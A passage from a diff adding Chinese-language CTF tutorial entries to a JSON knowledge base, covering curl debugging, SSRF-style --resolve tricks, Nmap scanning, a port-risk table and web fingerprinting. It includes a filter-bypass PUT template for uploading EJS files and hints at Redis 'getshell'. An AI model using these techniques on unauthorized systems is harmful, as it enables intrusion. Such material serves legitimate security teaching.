http://127.0.0.1:端口`；https 目标报证书错 → 加 `-k`（Burp 的 CA 证书没导入时）。\n\n#### 场景 8：SSRF / 直连内网（--resolve 与 Host 头）\n题目给了域名但服务器在内网、或需要指定 Host 时：\n```bash\n# 强制解析到指定 IP（绕过 DNS，让请求发给 127.0.0.1）\ncurl -sk --resolve target:80:127.0.0.1 http://target/\n# 只改 Host 头（服务器按 Host 路由）\ncurl -sk http://127.0.0.1/ -H \"Host: target\"\n```\n预期结果：请求实际打到了你指定的 IP/端口，服务器按 Host 内容响应。\n如果不行：`--resolve` 的格式是 `域名:端口:IP`，端口写错就无效；Host 头被校验就和服务器配置有关，慢慢对。\n\n#### 常见错误与排查\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| 所有请求都 403/429 | 频率太高 / 被 WAF 拦 | 加 `-m` 限速、换 UA（`-H \"User-Agent: Mozilla/5.0\"`）、降低频率 |\n| 中文参数乱码 | 没 URL 编码 | `--data-urlencode` |\n| 循环脚本卡死 | 有请求一直不返回 | 每条 curl 都加 `-m 5` |\n| 下载下来是 404 页面 | 文件不存在 | 先 `curl -I` 探测，或换路径 |\n| `%{time_total}` 输出的是字面量 | 写错位置 | 确认写在 `-w \"...\"` 里，且用了 `-o /dev/null` |\n\n#### 实战要点\n- **所有场景都能脚本化**：一条 curl 手测，确认后立刻用 for/while 循环批量跑，效率和正确率都翻倍。\n- 记住「三步走」：**手测（curl）→ 确认现象 → 批量（循环）**。\n- 拿不准参数就 `-v` 看全过程，再对比 Burp 里浏览器发的正常请求。\n- 这些命令都是「搬运工」，真正决定打法的是你对漏洞原理的理解——curl 只是让你把想法变成请求。"
+        },
+        {
+          "id": "curl-05-debug",
+          "title": "第 5 课：调试与排错（-v / -w 与报错速查表）",
+          "tags": [
+            "curl",
+            "调试",
+            "排错",
+            "-v",
+            "-w",
+            "报错",
+            "代理"
+          ],
+          "aliases": [
+            "curl -v",
+            "curl -w",
+            "curl 报错",
+            "curl 超时",
+            "curl 证书",
+            "curl 排错",
+            "curl 代理",
+            "curl ssl",
+            "curl 状态码"
+          ],
+          "difficulty": "easy",
+          "summary": "学会 -v 逐行读通信过程、-w 精确取数（状态码/耗时/大小）、常见报错编号速查表，自己就能排查 90% 的 curl 问题",
+          "content": "\n#### 这个条目的作用\n「我明明照着抄了，为什么不出结果？」——本课解决这个问题。学会 `-v` 逐行读通信过程、`-w` 精确取数、以及常见报错的快速判断，你就能自己排查 90% 的 curl 问题，不再瞎试。\n\n#### 前置条件\n- 会第 1、2 课的参数（尤其是 `-v`）。\n- 一个能正常访问的网址（如 `http://example.com`）用来对照「正常长什么样」。\n\n#### 第 1 步：-v 输出逐行读\n```bash\ncurl -v http://example.com\n```\n输出分三类行，用行首符号区分：\n| 行首 | 含义 | 例子 |\n|---|---|---|\n| `*` | 连接层面的过程信息 | `* Trying 93.184.215.14:80...`（正在连这个 IP） |\n| `>` | 你**发出去**的东西（请求行 + 请求头） | `> GET / HTTP/1.1`、`> User-Agent: curl/8.5.0` |\n| `<` | 服务器**回过来**的东西（状态行 + 响应头） | `< HTTP/1.1 200 OK`、`< Content-Type: text/html` |\n\n正常请求的 -v 长这样（关键行已标注）：\n```txt\n* Trying 93.184.215.14:80...          ← 找到服务器 IP，开始连\n* Connected to example.com ...        ← 连接成功\n> GET / HTTP/1.1                      ← 我发：GET 请求\n> Host: example.com                   ← 我发：Host 头（服务器靠它认域名）\n> User-Agent: curl/8.5.0              ← 我发：UA（暴露是 curl）\n>\n< HTTP/1.1 200 OK                     ← 服务器回：状态 200\n< Content-Type: text/html             ← 服务器回：响应头\n< ...（更多响应头）\n<\n<!doctype html>...                    ← 响应体（正文）\n```\n预期结果：你能说出「哪行是我发的、哪行是服务器回的」。\n如果不行：输出只有 `*` 没有 `>` 和 `<` → 根本没连上服务器，看第 4 步的报错表。\n\n> [!tip] 读 -v 的三个高频用途：1) 看状态行确认请求成功了没；2) 看请求头确认你发的头对不对（比如 Cookie 有没有带上）；3) 看服务器响应头里的技术栈（Server/X-Powered-By）。\n\n#### 第 2 步：从 -v 里读重定向和 Cookie\n```bash\ncurl -v http://target/login   # 不加 -L 看它跳不跳\n```\n预期结果：如果服务器要重定向，-v 里会出现：\n```txt\n< HTTP/1.1 302 Found\n< Location: http://target/dashboard\n```\n意思是：服务器说「去 `/dashboard`」，而你没加 `-L` 所以 curl 不会跟。看到 `302` + `Location` 就知道「这里会跳转」，需要加 `-L`。\n如果不行：没有 Location 行 → 没发生重定向，是别的原因（403/404）。\n\n再看 Cookie：服务器给你发 `Set-Cookie` 时：\n```txt\n< Set-Cookie: PHPSESSID=abc123; path=/\n```\n这就是登录成功的标志——`-c 文件` 会把它存下来，`-b 文件` 会把它发回去（见第 3 课）。\n\n#### 第 3 步：-w 格式化输出（精确取数）\n`-w \"格式\"` 在请求结束后按格式打印一段信息，格式里用 `%{变量}` 取数据。最常用的组合：\n```bash\n# 只要状态码\ncurl -s -o /dev/null -w \"%{http_code}\\n\" http://target/\n# 状态码 + 总耗时 + 下载大小（盲注计时、判断响应用）\ncurl -s -o /dev/null -w \"code=%{http_code} time=%{time_total}s size=%{size_download}\\n\" http://target/\n# 看最终落在哪个 URL（重定向终点）\ncurl -sL -o /dev/null -w \"%{url_effective}\\n\" http://target/login\n```\n| 变量 | 含义 | 典型用途 |\n|---|---|---|\n| `%{http_code}` | 状态码（200/302/404…） | 判断请求成功与否 |\n| `%{time_total}` | 总耗时（秒） | 时间盲注计时 |\n| `%{size_download}` | 下载字节数 | 判断响应是否异常地大/小 |\n| `%{url_effective}` | 最终实际访问的 URL | 看重定向终点 |\n| `%{redirect_url}` | 重定向指向的 URL | 配合 -L 前的判断 |\n\n`\\n` 表示换行（curl 自己会解析），不写的话输出会黏在一起。\n预期结果：终端打印 `200` 或 `code=200 time=0.05s size=1256` 这样的结果。\n如果不行：输出了 `%{http_code}` 字面量 → 拼写/引号问题，确认 `%{...}` 在 `-w \"...\"` 里、变量名拼对（http_code 不是 httpcode）。\n\n#### 第 4 步：常见报错速查表\ncurl 报错都带编号，看到编号查表：\n| 报错 | 意思 | 解决 |\n|---|---|---|\n| `(6) Could not resolve host` | 域名解析失败 | 域名拼写、DNS、网络 |\n| `(7) Failed to connect` | 连不上服务器（端口没开/IP 不对） | 确认靶机状态、端口、地址 |\n| `(28) Operation timed out` | 请求超时（目标不响应/太慢） | 加 `-m` 限制；确认目标可达；可能被 WAF 拖时间 |\n| `(35) SSL connect error` | TLS 握手失败（证书/协议不匹配） | `-k`；`--tlsv1.2`；换 http |\n| `(60) SSL certificate problem` | 证书不受信任（自签名/过期） | `-k` 跳过验证（靶机常见） |\n| `(22) HTTP page not retrieved` | HTTP 层错误（4xx/5xx 被当成错误） | 看状态码：404 路径错，403 权限/拦截，500 服务端炸 |\n| `(18) Partial file` | 下载中断（传输被切断） | 重试；`-C -` 断点续传 |\n| `(52) Empty reply from server` | 服务器连接被关闭没回内容 | 确认服务正常；协议对不对（http vs https） |\n| `(51) SSL peer certificate ...` | 同 60，证书问题 | `-k` |\n| `(56) Recv failure` | 连接被重置/中断 | 服务器主动断连；换参数重试 |\n\n快速判断口诀：\n1. 带 `SSL`/`certificate` 的 → 加 `-k`。\n2. 带 `resolve`/`connect` 的 → 地址或网络问题。\n3. 带 `timed out` 的 → 目标慢/不可达，加 `-m` 防卡，先确认可达。\n4. `22`/HTTP 数字 → 服务器已经理你了，看状态码本身。\n\n#### 第 5 步：代理与网络排查\n```bash\n# 看请求到底走了哪（-v 第一行 * Trying 后面的 IP）\ncurl -v http://target/\n\n# 挂代理（Burp/mitmproxy）\ncurl -sk -x http://127.0.0.1:8080 http://target/\n\n# 指定解析（绕过 DNS，直连 IP）\ncurl -sk --resolve target:80:127.0.0.1 http://target/\n```\n预期结果：`-v` 显示连接的目标 IP；挂代理后代理软件能看到流量。\n如果不行：挂代理反而报错 → 代理地址端口对不对；https 目标过代理要 `-k` 或信任代理 CA。\n\n#### 常见错误与排查\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| `-v` 输出乱码 | 服务器返回二进制 | 正常，`-v` 关注头，别盯着体 |\n| 加了 `-k` 还报 SSL | TLS 版本太老/太新 | `--tlsv1.2` / `--tlsv1.3` 指定版本 |\n| `-w` 不换行 | 忘写 `\\n` | `-w \"%{http_code}\\n\"` |\n| 代理后全 502 | 代理本身问题 | 检查代理软件；确认没配错端口 |\n| 一会儿通一会儿不通 | 网络抖动/限速 | 加 `--retry 3` 自动重试 |\n\n#### 实战要点\n- **遇到问题先 `-v` 再看报错编号**：编号告诉你「哪一层」出了问题（DNS/连接/TLS/HTTP），方向对了解决就快。\n- `-w` 是盲注和状态判断的神器，务必会写 `-w \"%{http_code}\\n\"` 和 `-w \"%{time_total}\\n\"` 这两句。\n- 报错编号不用背，知道「查表」这件事本身就能省你大量时间。\n- 本课 + 前 4 课 = curl 完整技能包：装好 → 会参数 → 会提交 → 会实战 → 会排错。"
+        },
+        {
+          "id": "curl-06-windows",
+          "title": "第 6 课：Windows/PowerShell 实战排坑 + 两个必背参数",
+          "tags": [
+            "curl",
+            "windows",
+            "powershell",
+            "path-as-is",
+            "data-binary",
+            "排坑"
+          ],
+          "aliases": [
+            "curl windows",
+            "powershell curl",
+            "--path-as-is",
+            "path-as-is",
+            "curl 引号",
+            "data-binary"
+          ],
+          "difficulty": "easy",
+          "summary": "实战里 80% 的\"照抄了却不行\"出在 Windows/PowerShell 环境而不是题目本身：引号被吃、BOM 破坏 JSON、目录没权限。本课把 Windows 上发请求的所有坑一次排干净，并讲透两个 CTF 高频但教材很少提的参数。",
+          "content": "#### 为什么 Windows 上这么容易翻车\nWindows 的 PowerShell 不是 bash，它对引号、编码、命令别名的处理和 Linux 完全不同。打靶时同一套命令在 Linux 上能跑、Windows 上就报错，十有八九是下面四个坑之一。\n#### 坑 1：PowerShell 里 curl 是假的（是 Invoke-WebRequest 的别名）\n```powershell\ncurl http://target/      # PowerShell 里这个 curl 是 Invoke-WebRequest，语法完全不同！\ncurl.exe http://target/  # 加 .exe 才是真 curl\n```\n打靶命令一律写 `curl.exe`，否则 `-X`、`-d` 这些参数全不认。\n#### 坑 2：内联 JSON 会被吃引号（-d 的经典翻车）\n```powershell\n# 这样发 JSON 大概率失败：PowerShell 会把双引号吞掉，服务器收到 {content:...} 解析报 400\ncurl.exe -X POST http://target/ -H \"Content-Type: application/json\" -d '{\"content\":\"abc\"}'\n```\n解法：把 JSON 写进文件，让 curl 读文件，绕开一切引号问题：\n```powershell\n$json = '{\"content\":\"abc\"}'\nSet-Content -Path body.json -Value $json -Encoding ascii   # 注意 ascii：无 BOM\ncurl.exe -X POST http://target/ -H \"Content-Type: application/json\" --data-binary \"@body.json\"\n```\n> [!warn] 编码必须 `-Encoding ascii`（或用 `[System.IO.File]::WriteAllText(\"$PWD\\body.json\", $json)`）。PowerShell 5.1 的 `-Encoding utf8` 会写 BOM，BOM 粘在 JSON 开头，服务器 JSON.parse 直接 400。\n#### 坑 3：管理员 PowerShell 默认目录是 system32，写文件被拒\n管理员模式打开 PowerShell 默认在 `C:\\WINDOWS\\system32`，往那里写文件报\"访问被拒绝\"。先 `cd $HOME`（回到 C:\\Users\\你）再写文件。\n#### 坑 4：--data-binary \"@文件\" 是什么\n- `--data-binary`：发数据，且一字不差（不像 `-d` 会把换行/空格当分隔符处理）\n- `@文件名`：表示\"去读这个文件的内容\"，不是发字面 \"@body.json\"\n连起来 `--data-binary \"@body.json\"` = \"把 body.json 的内容原封不动当请求体发出去\"。这是 Windows 上发 JSON 最稳的方式。\n#### 重点参数：--path-as-is（URL 规范化陷阱）\ncurl 默认会把 URL 里的 `/.`、`/../` 等\"多余片段\"自己折叠掉再发（libcurl 标准行为）。但 CTF 里这类字符常常就是绕过过滤的关键：\n```powershell\ncurl.exe --path-as-is -X PUT \"http://target/views/x.ejs/.\" ...   # 原样发送 /views/x.ejs/.\n```\n不加 `--path-as-is`，curl 会把 `/views/x.ejs/.` 折叠成 `/views/x.ejs/`，绕过直接失效。**凡是 payload 里带 `/.` 或 `..` 且需要原样发送的，一律加 `--path-as-is`**。\n> [!tip] 判断 curl 有没有折叠 URL：加 `-v`，看 `> PUT /views/x.ejs/. HTTP/1.1` 这一行实际发出去的路径是什么。\n#### PowerShell 全家桶的选择（各有什么坑）\n| 工具 | 会不会折叠 `/.` | 引号问题 | 结论 |\n|---|---|---|---|\n| curl.exe + --data-binary @文件 | 会，--path-as-is 可关 | 无（读文件） | ✅ 首选 |\n| curl.exe + -d 内联 | 会，--path-as-is 可关 | 会吃引号 | ❌ 别用 |\n| Invoke-RestMethod / Invoke-WebRequest | 会折叠且无法关闭 | 无 | ❌ 含 `/.` 的绕过用不了 |\n| Burp / Postman | 不折叠 | 无 | ✅ 图形界面备选 |\n#### 一套能直接抄的 Windows 发 JSON 模板\n```powershell\ncd $HOME\n$json = '{\"content\":\"你要发的内容\"}'\nSet-Content -Path body.json -Value $json -Encoding ascii\ncurl.exe --path-as-is -X PUT \"http://目标/views/文件名.ejs/.\" -H \"Content-Type: application/json\" --data-binary \"@body.json\"\ncurl.exe \"http://目标/?templ=文件名\"\n```\n> [!warn] 上传类题目返回 \"File already exists\"：服务器不允许覆盖已有文件，把文件名换一个（x.ejs → y.ejs），上传和触发两处一起改。\n#### 状态码速查（PUT 上传场景）\n| 状态码 | 含义 | 下一步 |\n|---|---|---|\n| 201 / \"File created\" | 写入成功 | 去触发/访问它 |\n| 403 \"Denied\" | 被过滤拦 | 检查 --path-as-is、路径里的特殊字符 |\n| 500 + Buffer 报错 | 服务器没收到内容 | body.json 空？-H 没写？cd $HOME 了吗 |\n| 500 + \"File already exists\" | 文件名用过了 | 换文件名 |"
+        }
+      ]
+    },
+    {
+      "id": "g-scan",
+      "name": "扫描与指纹识别",
+      "intro": "端口、版本与站点指纹，信息收集第一步",
+      "entries": [
+        {
+          "id": "nmap-basic",
+          "title": "Nmap 参数全集",
+          "tags": [
+            "nmap",
+            "scan",
+            "port",
+            "service"
+          ],
+          "aliases": [
+            "nmap",
+            "端口扫描",
+            "服务探测"
+          ],
+          "difficulty": "easy",
+          "summary": "Nmap 是最常用的端口扫描与主机发现工具，掌握核心参数即可覆盖信息收集阶段九成需求。",
+          "content": "\n#### 这个条目的作用\nNmap（Network Mapper）是信息收集的第一件武器：它告诉你目标开了哪些端口、跑着什么服务、用的什么操作系统。拿到这份清单，才知道后续该测 Web 还是数据库、该打哪个漏洞。本条目把最常用的参数按用途分组讲透，每一条都给完整命令。\n\n#### 前置条件\n- 一台装了 Nmap 的机器（Kali 自带；其他系统用 `sudo apt install nmap` 或 `brew install nmap` 安装）。\n- 目标授权：扫描是主动探测，务必确认你有权扫这个目标。\n- root 权限：`-sS`、`-O` 等参数需要 root；普通用户只能跑 `-sT`。\n- 与目标的网络连通性：可以先 `ping 目标IP` 确认在线。\n\n#### 第 1 步：确认 Nmap 可用\n```bash\nnmap -V\n```\n预期结果：输出版本号，例如 `Nmap version 7.94`。如果提示 `command not found`，先安装（见前置条件）。\n\n#### 第 2 步：主机发现（先确认目标活着）\n```bash\nnmap -sn 192.168.1.0/24\n```\n- `-sn` 只做 ping 扫描，不扫端口，适合先摸清一个网段里有哪些主机在线。\n- 预期结果：列出在线主机的 IP 和 MAC。如果目标禁 ping，主机可能不显示，这时直接进第 3 步用 `-Pn` 扫。\n\n#### 第 3 步：快速端口摸底（第一遍扫描）\n```bash\nnmap -T4 --top-ports 1000 192.168.1.10\n```\n- `--top-ports 1000` 只扫最常见的 1000 个端口，几十秒完成；`-T4` 是较快的时间模板。\n- 预期结果：列出 open 状态的端口。这一步的目的是「先快后慢」：先知道大概开了什么，再决定要不要全端口扫。\n\n#### 第 4 步：全端口扫描（需要时）\n```bash\nnmap -p- -T4 192.168.1.10\n```\n- `-p-` 扫全部 65535 个端口，慢（可能十几分钟），但不会漏掉非常规端口上的服务（很多靶机把后台藏在 8080、8888、31337 这种端口）。\n- 只想看开放端口、不想看 closed 刷屏：加 `--open`。\n- 如果目标禁 ping，加上 `-Pn`：`nmap -p- -Pn 192.168.1.10`。\n\n#### 第 5 步：服务版本与默认脚本探测（第二遍，重点）\n```bash\nnmap -sV -sC -p 80,443,8080 192.168.1.10\n```\n- `-sV` 探测服务版本（如 Apache 2.4.49、nginx 1.18.0）。\n- `-sC` 加载默认 NSE 安全脚本，自动做目录枚举、HTTP 头检查等轻量探测。\n- 只对第 3、4 步发现的开放端口跑，别全端口 `-sV -sC`，会很慢。\n- 预期结果：每个端口一行，给出 `STATE`（open）、`SERVICE`（服务名）、`VERSION`（版本号）。\n\n#### 第 6 步：全面探测（偷懒组合拳）\n```bash\nnmap -A 192.168.1.10\n```\n- `-A` 等于 `-sV -sC -O --traceroute` 四合一：版本 + 脚本 + 操作系统指纹 + 路由追踪。\n- 适合小范围目标一次拿全；公网大网段慎用（慢且易触发告警）。\n\n#### 第 7 步：保存结果，避免返工\n```bash\nnmap -sV -sC -p- -T4 -oN scan.txt 192.168.1.10\nnmap -sV -sC -p- -T4 -oA scan 192.168.1.10\n```\n- `-oN scan.txt` 输出普通文本，方便后面粘贴到笔记。\n- `-oA scan` 同时输出 normal/greppable/xml 三种格式，配合自动化工具用。\n- 多个目标：`-iL list.txt` 从文件读目标列表，一行一个。\n\n#### 常见错误与排查\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| 提示 `You requested a scan type which requires root privileges` | 用了 `-sS` 但没有 root | 加 `sudo`，或改用 `-sT` 全连接扫描 |\n| 扫出来全是 `filtered` | 防火墙拦截 | 换 `-Pn` 跳过主机发现，或换端口范围确认 |\n| 目标明明开着 80 却显示 closed | 禁 ping 导致误判 | 加 `-Pn` 强制扫端口 |\n| 扫描特别慢 | `-p-` 全端口或 `-T0/-T1` 慢模板 | 先 `--top-ports 1000` 摸底，确认需要再全扫 |\n| 提示 `Failed to resolve given hostname` | 域名拼错或 DNS 不通 | 直接用 IP，或确认域名拼写 |\n\n#### 实战要点\n- 标准流程是两遍：`--top-ports 1000` 快速摸底 → 对开放端口 `-sV -sC` 精确探测，不要一上来 `-p- -A` 全上。\n- 拿到服务版本号后，第一时间对照版本查已知漏洞（如 Apache 2.4.49 路径穿越、nginx 目录穿越）。\n- 靶机里「非常规端口 + 常见服务」是出题人的最爱，`-p-` 值得等。\n- 记录所有输出文件，用 `-oN` 存一份纯文本，后面写报告直接引用。\n- `-sU`（UDP 扫描）极慢且常被防火墙挡，只有明确怀疑 UDP 服务（如 SNMP 161）时才跑，配合 `--top-ports 50` 限定范围。\n- 扫描节奏：`-T3` 是默认均衡档，公网敏感目标用 `-T2` 更不易触发告警。\n\n> [!tip] 先快后慢：先用 `-T4 --top-ports 1000` 快速摸底，再对开放端口做 `-sV -sC` 精确探测，避免一上来 `-p-` 全扫浪费时间。\n\n> [!warn] `-A` 与 `-p-` 组合在公网大范围扫描时很慢且易触发告警，注意目标授权与扫描节奏。"
+        },
+        {
+          "id": "port-services",
+          "title": "常见端口与服务对照",
+          "tags": [
+            "port",
+            "service",
+            "mapping"
+          ],
+          "aliases": [
+            "端口对照",
+            "服务识别"
+          ],
+          "difficulty": "easy",
+          "summary": "端口对应服务是信息收集起点，命中 Redis、Elasticsearch、MongoDB 等往往直接指向未授权访问入口。",
+          "content": "\n#### 这个条目的作用\n扫描拿到端口号只是第一步，把端口翻译成「这是什么服务、有什么常见风险」才是信息收集的价值所在。本表覆盖 CTF 与实战中最常出现的端口：命中 Redis、Elasticsearch、MongoDB 这类服务，往往直接指向未授权访问入口，一步就到洞。\n\n#### 前置条件\n- 已用 Nmap 拿到目标开放端口列表（`nmap -sV -p-` 最佳，带版本号更好用）。\n- 一张能随时翻的对照表（就是本条目）。\n\n#### 第 1 步：整理扫描结果\n```bash\nnmap -sV --open -T4 192.168.1.10 -oN ports.txt\ncat ports.txt\n```\n预期结果：看到类似 `6379/tcp open redis Redis key-value store` 的行。把每个 open 端口的「端口号 + 服务 + 版本」抄进笔记，作为对照表的输入。\n\n#### 第 2 步：对照常见端口表\n| 端口 | 服务 | 常见风险点 |\n|---|---|---|\n| 21 | FTP | 匿名登录、弱口令、vsftpd 后门 |\n| 22 | SSH | 弱口令、用户枚举、SSH 隧道 |\n| 23 | Telnet | 明文传输、弱口令 |\n| 25 | SMTP | 邮件用户枚举、开放中继 |\n| 53 | DNS | 区域传送（AXFR）泄露 |\n| 80 | HTTP | 常规 Web 攻击面 |\n| 135 | MSRPC | MS17-010 等 RPC 漏洞 |\n| 139/445 | NetBIOS/SMB | MS17-010、SMBGhost、共享枚举 |\n| 443 | HTTPS | 加密 Web 攻击面 |\n| 873 | rsync | 未授权访问、任意文件读取 |\n| 1433 | MSSQL | sa 弱口令、xp_cmdshell |\n| 1521 | Oracle | 弱口令、TNS 漏洞 |\n| 2181 | ZooKeeper | 未授权访问 |\n| 3306 | MySQL | root 弱口令、udf 提权 |\n| 3389 | RDP | 弱口令、BlueKeep |\n| 5432 | PostgreSQL | 弱口令、命令执行 |\n| 5601 | Kibana | 未授权访问 |\n| 6379 | Redis | 未授权、写公钥/计划任务 getshell |\n| 7001 | WebLogic | 反序列化、SSRF |\n| 8080 | HTTP 代理/Web | 代理滥用、Web 攻击面 |\n| 8443 | HTTPS 备用 | Web 攻击面 |\n| 8888 | 宝塔面板 | 弱口令、未授权 |\n| 9000 | PHP-FPM/Portainer | FastCGI 未授权执行 |\n| 9090 | 管理面板 | 弱口令 |\n| 9200 | Elasticsearch | 未授权访问、数据泄露 |\n| 11211 | Memcached | 未授权、DRDoS 反射 |\n| 27017 | MongoDB | 未授权访问、数据泄露 |\n\n对照方法：把第 1 步抄下来的端口号在表里找。表里没列到的端口，跳到第 3 步。\n\n#### 第 3 步：识别表外端口\n表里没有的端口不要慌，先问服务探测要版本：\n```bash\nnmap -sV -p 31337 192.168.1.10\n```\n预期结果：输出 `31337/tcp open http` 之类。拿到服务名和版本后，去搜索引擎查「服务名 版本 漏洞」（如 `nginx 1.18.0 CVE`）。很多靶机会用非常规端口跑 Web 服务，`-sV` 能直接识别出 http。\n\n#### 第 4 步：验证未授权访问类服务（重点）\n表里标了「未授权访问」的服务，直接动手验证（以 Redis 为例）：\n```bash\nredis-cli -h 192.168.1.10 -p 6379 info\n# 或先探测 banner：\nnc -nv 192.168.1.10 6379\n```\n- 预期结果：`redis-cli` 能连上并返回 server 信息，说明未授权，可直接 `keys *` 看数据、甚至写公钥 getshell。\n- 同理可试：Elasticsearch `curl http://IP:9200`、MongoDB `mongosh IP:27017`、ZooKeeper `echo ruok | nc IP 2181`。\n- 如果被拒（`DENIED`、`-NOAUTH`），说明有认证，走弱口令路线，别硬来。\n\n#### 第 5 步：按服务类型决定下一步\n- Web 类（80/443/8080/8443 等）：交给指纹识别与目录枚举（见 fingerprint、dir-search 条目）。\n- 数据库类（3306/1433/5432/27017 等）：先试未授权，再试弱口令（root/root、admin/admin 等），最后才是爆破解密。\n- 中间件类（7001/8888/9090 等）：查对应版本已知漏洞（WebLogic 反序列化、宝塔面板等）。\n- 文件共享类（21/139/445/873）：试匿名登录 `ftp`、`smbclient -L //IP/`、`rsync IP::`。\n\n#### 常见错误与排查\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| 端口服务名显示为 `unknown` | 服务不在 Nmap 指纹库 | 用 `nc -nv IP 端口` 手动连，看 banner 文字 |\n| 服务看起来像数据库但连不上 | 端口做了转发或套了隧道 | 再扫一次完整端口确认，或用 `-sV --version-intensity 9` 加深探测 |\n| 未授权访问验证失败 | 新版本默认开启认证 | 确认版本，新版 Redis 6+ 默认配置也常要密码，改试弱口令 |\n| 对着端口表找漏洞找不到 | 版本信息缺失 | 先 `-sV` 拿准版本号再查 CVE，别拿端口号硬搜 |\n\n#### 实战要点\n- 「端口 + 服务 + 版本」三要素缺一不可，版本是查 CVE 的钥匙。\n- 未授权访问类服务（Redis/MongoDB/Elasticsearch）一旦验证成功就是独立高危漏洞，优先上报也优先利用。\n- 非常规端口上跑着常见服务（如 31337 上的 http、6379 上的 Redis）在靶机里非常常见，别被端口号骗了。\n- 看到 7001（WebLogic）、8888（宝塔）、2181（ZooKeeper）这类特征端口，直接查对应专项利用链。\n- 验证未授权访问时用只读命令（`info`、`GET`、`ls`）先看，别上来就 `flushall`、`del` 破坏数据——靶机环境也讲基本法。\n\n> [!tip] 不认识的端口先用 `nmap -sV` 拿版本，再查对应版本历史漏洞；未授权类漏洞优先手动验证。"
+        },
+        {
+          "id": "fingerprint",
+          "title": "Web 指纹识别三件套",
+          "tags": [
+            "fingerprint",
+            "wappalyzer",
+            "whatweb",
+            "nikto"
+          ],
+          "aliases": [
+            "指纹识别",
+            "whatweb",
+            "nikto"
+          ],
+          "difficulty": "easy",
+          "summary": "指纹识别确定站点框架与中间件版本，是选 exploit 的前提，版本对应关系要人工核对。",
+          "content": "\n#### 这个条目的作用\n指纹识别回答三个问题：这站用的什么框架、什么中间件、什么版本。答案是选 exploit 的前提——同样的注入点，ThinkPHP 和 Spring 的利用方式完全不同。本条目覆盖浏览器扩展（Wappalyzer）与命令行（WhatWeb、Nikto）三种主流方式，外加 httpx 批量场景。\n\n#### 前置条件\n- 目标 URL（如 `http://192.168.1.10`）。\n- Wappalyzer：浏览器扩展商店搜索安装（Chrome/Firefox 都有）。\n- WhatWeb、Nikto：Kali 自带；其他系统 `sudo apt install whatweb nikto`。\n- 授权：Nikto 是主动漏洞扫描，动静大，注意节奏。\n\n#### 第 1 步：Wappalyzer 秒看技术栈（零成本）\n1. 浏览器安装 Wappalyzer 扩展，固定到工具栏。\n2. 打开目标站点，点击 Wappalyzer 图标。\n3. 预期结果：弹出列表显示框架（如 ThinkPHP、Laravel）、服务器（nginx）、JS 库（jQuery 3.6.0）、CDN 等。\n4. 把技术栈抄进笔记。注意：Wappalyzer 是纯前端嗅探，只能看到加载的静态特征，改版后的单页应用可能识别不全，需要命令行工具交叉验证。\n\n#### 第 2 步：WhatWeb 命令行指纹（Kali 自带）\n```bash\nwhatweb http://target.com\n```\n预期结果：一行输出，包含 `Server: nginx/1.18.0`、`X-Powered-By: PHP/7.4.33`、`JQuery` 等技术指纹。比 Wappalyzer 更可靠，因为它会读 HTTP 响应头。\n\n#### 第 3 步：WhatWeb 激进模式与子目录\n```bash\nwhatweb -a 3 http://target.com\nwhatweb http://target.com/admin/\n```\n- `-a 3` 激进模式：更积极地请求更多路径、插件探测，命中率更高，也更吵。\n- 对怀疑有后台的目录单独扫，能识别目录级技术栈（如 `/admin/` 下是另一套系统）。\n- 多目标：`whatweb http://a.com http://b.com` 或 `whatweb -i urls.txt`。\n\n#### 第 4 步：Nikto 漏洞初筛（主动扫描）\n```bash\nnikto -h http://target.com\nnikto -h http://target.com -p 8080\n```\n- `-h` 指定目标；`-p` 指定端口。\n- 预期结果：滚动输出发现项，如 `Server leaks inode via ETag`、`Cookie without HttpOnly flag`、`OSVDB-...` 编号条目。\n- 保存报告：`nikto -h http://target.com -o out.html`（或 `-o out.txt`）。\n- 注意：Nikto 误报率很高，它的输出是「待验证线索」不是结论。\n\n#### 第 5 步：httpx 批量探活加指纹（资产多时）\n```bash\ncat urls.txt\n# 每行一个域名/IP，然后：\nhttpx -l urls.txt -title -status-code -tech-detect -web-server\n```\n- `-title` 抓页面标题、`-status-code` 显示状态码、`-tech-detect` 识别技术栈、`-web-server` 显示服务器软件。\n- 预期结果：每行一个目标，输出状态码、标题、技术栈，一眼看出哪个是重点资产。\n- 没有 httpx 时：Kali 直接 `sudo apt install httpx`，或按 ProjectDiscovery 官方文档用 go 安装。\n\n#### 第 6 步：人工核对版本\n拿到版本号（如 `ThinkPHP 5.0.23`）后：去官方文档或漏洞库查该版本是否存在已知漏洞，确认利用条件（是否需要特定配置、是否需要登录），再决定用哪条 exploit。别拿过期 exp 硬套。\n\n#### 常见错误与排查\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| Wappalyzer 什么都不显示 | 单页应用或纯静态页 | 换 whatweb 看响应头，或看 JS 源码找框架特征 |\n| whatweb 只输出 `Server` 没有框架 | 站点隐藏了指纹头 | 加 `-a 3` 激进探测，或查页面源码特征 |\n| Nikto 扫出一堆 OSVDB 条目 | 误报或低危噪音 | 按条目标题人工复核，重点关注「vulnerable」「exposed」字样 |\n| 指纹显示版本和实际不符 | 响应头被反代隐藏或伪造 | 用 `curl -I` 直连真实后端（跳过 CDN/反代）再看 |\n| 拿到版本却找不到对应 exp | 版本太新或记错 | 回官方公告与 NVD 查 CVE，确认版本范围再搜 exp |\n\n#### 实战要点\n- 三件套分工：Wappalyzer 秒开秒看，whatweb 命令行精确，Nikto 找已知问题，httpx 管批量。\n- 指纹是「选武器」的输入：先知道 ThinkPHP/Spring/Node 哪家，再决定注入、反序列化还是命令执行路线。\n- 版本号必须人工核对利用条件，很多公开 exp 有版本范围和配置前提，直接跑大概率失败还留日志。\n- 隐藏的框架特征常常在 JS 文件、错误页、`X-Powered-By` 头里，`curl -I` 和查看页面源码是核验指纹的兜底手段。\n- 敏感目标用 whatweb/nikto 注意限速（nikto 有 `-Tuning` 和延迟参数），大批量探活用 httpx 单线程排队更低调。\n\n> [!warn] Nikto 误报率高，结果需人工复核；指纹版本号要回官方文档确认漏洞利用条件，别拿过期 exp 硬套。"
+        }
+      ]
+    },
+    {
+      "id": "g-dir",
+      "name": "目录与资源枚举",
+      "intro": "找后台、找备份、找接口",
+      "entries": [
+        {
+          "id": "dir-search",
+          "title": "目录扫描三件套模板",
+          "tags": [
+            "dirsearch",
+            "ffuf",
+            "gobuster",
+            "dir"
+          ],
+          "aliases": [
+            "目录扫描",
+            "ffuf",
+            "gobuster"
+          ],
+          "difficulty": "easy",
